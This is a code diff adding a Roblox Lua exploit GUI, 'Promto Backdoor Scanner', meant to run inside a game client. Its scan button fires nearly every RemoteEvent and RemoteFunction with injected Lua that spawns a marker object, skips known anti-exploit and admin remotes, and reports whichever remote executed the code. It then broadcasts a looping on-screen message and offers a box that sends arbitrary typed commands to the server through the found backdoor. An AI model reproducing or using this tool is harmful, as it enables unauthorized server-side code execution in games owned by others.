@@ -1,0 +1,381 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @promtodev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  BACKDOOR SCANNER
+]=]
+
+-- Instances: 15 | Scripts: 3 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.PromtoBackdoor
+G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"]["IgnoreGuiInset"] = true;
+G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
+G2L["1"]["Name"] = [[PromtoBackdoor]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1"]["ResetOnSpawn"] = false;
+
+-- StarterGui.PromtoBackdoor.MainFrame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 30);
+G2L["2"]["BackgroundTransparency"] = 0.1;
+G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
+G2L["2"]["Size"] = UDim2.new(0, 400, 0, 400);
+G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Name"] = [[MainFrame]];
+
+-- StarterGui.PromtoBackdoor.MainFrame.UICorner
+G2L["3"] = Instance.new("UICorner", G2L["2"]);
+G2L["3"]["CornerRadius"] = UDim.new(0, 15);
+
+-- StarterGui.PromtoBackdoor.MainFrame.UIStroke
+G2L["4"] = Instance.new("UIStroke", G2L["2"]);
+G2L["4"]["Color"] = Color3.fromRGB(100, 100, 255);
+G2L["4"]["Thickness"] = 2;
+G2L["4"]["Transparency"] = 0.3;
+
+-- StarterGui.PromtoBackdoor.MainFrame.Title
+G2L["5"] = Instance.new("TextLabel", G2L["2"]);
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["TextSize"] = 24;
+G2L["5"]["TextColor3"] = Color3.fromRGB(220, 220, 255);
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 45);
+G2L["5"]["FontFace"] = Font.new([[rbxassetid://12187365364]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["5"]["Size"] = UDim2.new(1, 0, 0, 60);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Text"] = [[🛡️ PROMTO BACKDOOR]];
+G2L["5"]["Position"] = UDim2.new(0, 0, 0, 0);
+G2L["5"]["Name"] = [[Title]];
+
+-- StarterGui.PromtoBackdoor.MainFrame.Title.UICorner
+G2L["6"] = Instance.new("UICorner", G2L["5"]);
+G2L["6"]["CornerRadius"] = UDim.new(0, 15);
+
+-- StarterGui.PromtoBackdoor.MainFrame.ScanButton
+G2L["7"] = Instance.new("TextButton", G2L["2"]);
+G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["TextSize"] = 18;
+G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 150, 255);
+G2L["7"]["FontFace"] = Font.new([[rbxassetid://12187365364]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["7"]["Size"] = UDim2.new(0, 200, 0, 45);
+G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["Text"] = [[🔍 START SCANNING]];
+G2L["7"]["Position"] = UDim2.new(0.5, -100, 0.3, 0);
+G2L["7"]["Name"] = [[ScanButton]];
+
+-- StarterGui.PromtoBackdoor.MainFrame.ScanButton.UICorner
+G2L["8"] = Instance.new("UICorner", G2L["7"]);
+G2L["8"]["CornerRadius"] = UDim.new(0, 10);
+
+-- StarterGui.PromtoBackdoor.MainFrame.CommandFrame
+G2L["9"] = Instance.new("Frame", G2L["2"]);
+G2L["9"]["BorderSizePixel"] = 0;
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 40);
+G2L["9"]["BackgroundTransparency"] = 0.2;
+G2L["9"]["Size"] = UDim2.new(0, 350, 0, 150);
+G2L["9"]["Position"] = UDim2.new(0.06, 0, 0.45, 0);
+G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["Name"] = [[CommandFrame]];
+G2L["9"]["Visible"] = false;
+
+-- StarterGui.PromtoBackdoor.MainFrame.CommandFrame.UICorner
+G2L["a"] = Instance.new("UICorner", G2L["9"]);
+G2L["a"]["CornerRadius"] = UDim.new(0, 10);
+
+-- StarterGui.PromtoBackdoor.MainFrame.CommandFrame.CommandBox
+G2L["b"] = Instance.new("TextBox", G2L["9"]);
+G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["TextSize"] = 14;
+G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b"]["BackgroundColor3"] = Color3.fromRGB(35, 35, 55);
+G2L["b"]["FontFace"] = Font.new([[rbxassetid://12187365364]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b"]["MultiLine"] = true;
+G2L["b"]["Size"] = UDim2.new(0, 330, 0, 100);
+G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["Text"] = [[]];
+G2L["b"]["Position"] = UDim2.new(0.03, 0, 0.1, 0);
+G2L["b"]["PlaceholderText"] = [[Enter your command here...]];
+G2L["b"]["Name"] = [[CommandBox]];
+G2L["b"]["TextWrapped"] = true;
+G2L["b"]["ClearTextOnFocus"] = false;
+
+-- StarterGui.PromtoBackdoor.MainFrame.CommandFrame.CommandBox.UICorner
+G2L["c"] = Instance.new("UICorner", G2L["b"]);
+G2L["c"]["CornerRadius"] = UDim.new(0, 8);
+
+-- StarterGui.PromtoBackdoor.MainFrame.ExecuteButton
+G2L["d"] = Instance.new("TextButton", G2L["2"]);
+G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["TextSize"] = 16;
+G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(0, 200, 100);
+G2L["d"]["FontFace"] = Font.new([[rbxassetid://12187365364]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["d"]["Size"] = UDim2.new(0, 120, 0, 35);
+G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d"]["Text"] = [[🚀 EXECUTE]];
+G2L["d"]["Position"] = UDim2.new(0.5, -60, 0.8, 0);
+G2L["d"]["Name"] = [[ExecuteButton]];
+G2L["d"]["Visible"] = false;
+
+-- StarterGui.PromtoBackdoor.MainFrame.ExecuteButton.UICorner
+G2L["e"] = Instance.new("UICorner", G2L["d"]);
+G2L["e"]["CornerRadius"] = UDim.new(0, 8);
+
+-- StarterGui.PromtoBackdoor.MainFrame.StatusLabel
+G2L["f"] = Instance.new("TextLabel", G2L["2"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["TextSize"] = 14;
+G2L["f"]["TextColor3"] = Color3.fromRGB(200, 200, 230);
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f"]["FontFace"] = Font.new([[rbxassetid://12187365364]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f"]["BackgroundTransparency"] = 1;
+G2L["f"]["Size"] = UDim2.new(1, 0, 0, 40);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f"]["Text"] = [[Ready to scan for backdoors...]];
+G2L["f"]["Position"] = UDim2.new(0, 0, 0.9, 0);
+G2L["f"]["Name"] = [[StatusLabel]];
+G2L["f"]["TextWrapped"] = true;
+
+-- StarterGui.PromtoBackdoor.MainFrame.CloseButton
+G2L["10"] = Instance.new("TextButton", G2L["2"]);
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["TextSize"] = 16;
+G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 60, 60);
+G2L["10"]["FontFace"] = Font.new([[rbxassetid://12187365364]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["10"]["Size"] = UDim2.new(0, 30, 0, 30);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["Text"] = [[X]];
+G2L["10"]["Position"] = UDim2.new(0.92, 0, 0.02, 0);
+G2L["10"]["Name"] = [[CloseButton]];
+
+-- StarterGui.PromtoBackdoor.MainFrame.CloseButton.UICorner
+G2L["11"] = Instance.new("UICorner", G2L["10"]);
+G2L["11"]["CornerRadius"] = UDim.new(0, 15);
+
+-- StarterGui.PromtoBackdoor.LocalScript
+G2L["12"] = Instance.new("LocalScript", G2L["1"]);
+
+-- StarterGui.PromtoBackdoor.DragScript
+G2L["13"] = Instance.new("LocalScript", G2L["1"]);
+G2L["13"]["Name"] = [[DragScript]];
+
+-- StarterGui.PromtoBackdoor.MainFrame.CloseButton.LocalScript
+G2L["14"] = Instance.new("LocalScript", G2L["10"]);
+
+-- StarterGui.PromtoBackdoor.MainFrame.ScanButton.LocalScript
+G2L["15"] = Instance.new("LocalScript", G2L["7"]);
+
+-- StarterGui.PromtoBackdoor.MainFrame.ExecuteButton.LocalScript
+G2L["16"] = Instance.new("LocalScript", G2L["d"]);
+
+-- StarterGui.PromtoBackdoor.MainFrame.CloseButton.LocalScript
+local function C_14()
+local script = G2L["14"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end;
+task.spawn(C_14);
+
+-- StarterGui.PromtoBackdoor.MainFrame.ScanButton.LocalScript
+local function C_15()
+local script = G2L["15"];
+	local function generateName(length)
+		local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+		local text = ''
+		for i = 1, length do
+			text = text .. alphabet[math.random(1, #alphabet)]
+		end
+		return text
+	end
+
+	local function runRemote(remote, data)
+		if remote:IsA('RemoteEvent') then
+			remote:FireServer(data)
+		elseif remote:IsA('RemoteFunction') then
+			spawn(function() remote:InvokeServer(data) end)
+		end
+	end
+
+	local function findBackdoor()
+		script.Parent.Parent.StatusLabel.Text = "🔄 Scanning game for backdoors..."
+		
+		local remotes = {}
+		local foundBackdoor = nil
+		
+		-- Check for protected backdoor first
+		local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+			local code = generateName(math.random(12,30))
+			spawn(function() 
+				protected_backdoor:InvokeServer('promto backdoor scanner', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
+			end)
+			remotes[code] = protected_backdoor
+		end
+		
+		-- Scan all remotes
+		for _, remote in pairs(game:GetDescendants()) do
+			if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
+				continue 
+			end
+			
+			-- Skip system remotes
+			if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
+				continue
+			end
+			
+			if remote.Parent == game:GetService("ReplicatedStorage") or 
+			   remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
+			   remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage") then
+				
+				-- Skip known anti-exploit systems
+				if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
+					continue
+				end
+				
+				if remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
+					continue
+				end
+				
+				if remote.Parent.Name == 'DefaultChatSystemChatEvents' then
+					continue
+				end
+			end
+			
+			-- Test the remote
+			local code = generateName(math.random(12,30))
+			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+			remotes[code] = remote
+		end
+		
+		-- Check for successful backdoors
+		for i = 1, 50 do
+			for code, remote in pairs(remotes) do
+				if workspace:FindFirstChild(code) then
+					script.Parent.Parent.StatusLabel.Text = "✅ Backdoor found: " .. remote:GetFullName()
+					
+					-- Send test commands
+					runRemote(remote, "a=Instance.new('Hint')a.Text='Promto Backdoor Scanner - Active'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					
+					return remote
+				end
+			end
+			wait(0.1)
+		end
+		
+		script.Parent.Parent.StatusLabel.Text = "❌ No backdoors found"
+		return nil
+	end
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Text = "🔄 SCANNING..."
+		
+		local backdoor = findBackdoor()
+		
+		if backdoor then
+			_G.PromtoBackdoor = backdoor
+			script.Parent.Parent.CommandFrame.Visible = true
+			script.Parent.Parent.ExecuteButton.Visible = true
+			script.Parent.Visible = false
+			script.Parent.Parent.StatusLabel.Text = "✅ Ready! Enter commands below"
+			
+			-- Show notification
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Title = "Promto Backdoor",
+				Text = "Backdoor scanner activated successfully!",
+				Duration = 5
+			})
+		else
+			script.Parent.Text = "🔍 RETRY SCAN"
+			script.Parent.Parent.StatusLabel.Text = "⚠️ No backdoors detected. Try again"
+		end
+	end)
+end;
+task.spawn(C_15);
+
+-- StarterGui.PromtoBackdoor.MainFrame.ExecuteButton.LocalScript
+local function C_16()
+local script = G2L["16"];
+	script.Parent.MouseButton1Click:Connect(function()
+		if _G.PromtoBackdoor and script.Parent.Parent.CommandFrame.CommandBox.Text ~= "" then
+			local success, err = pcall(function()
+				if _G.PromtoBackdoor:IsA('RemoteEvent') then
+					_G.PromtoBackdoor:FireServer(script.Parent.Parent.CommandFrame.CommandBox.Text)
+				elseif _G.PromtoBackdoor:IsA('RemoteFunction') then
+					spawn(function() _G.PromtoBackdoor:InvokeServer(script.Parent.Parent.CommandFrame.CommandBox.Text) end)
+				end
+			end)
+			
+			if success then
+				script.Parent.Parent.StatusLabel.Text = "✅ Command executed successfully!"
+			else
+				script.Parent.Parent.StatusLabel.Text = "❌ Error: " .. tostring(err)
+			end
+		end
+	end)
+end;
+task.spawn(C_16);
+
+-- StarterGui.PromtoBackdoor.LocalScript
+local function C_12()
+local script = G2L["12"];
+	script.Parent.DisplayOrder = 1000000
+	
+	-- Initial notification
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Promto Backdoor",
+		Text = "Scanner GUI loaded successfully!",
+		Duration = 5
+	})
+end;
+task.spawn(C_12);
+
+-- StarterGui.PromtoBackdoor.DragScript
+local function C_13()
+local script = G2L["13"];
+	local UserInputService = game:GetService("UserInputService")
+	local frame = script.Parent.MainFrame
+	local dragging = false
+	local dragInput, dragStart, startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+			
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end;
+task.spawn(C_13);
+
+return G2L["1"], require;
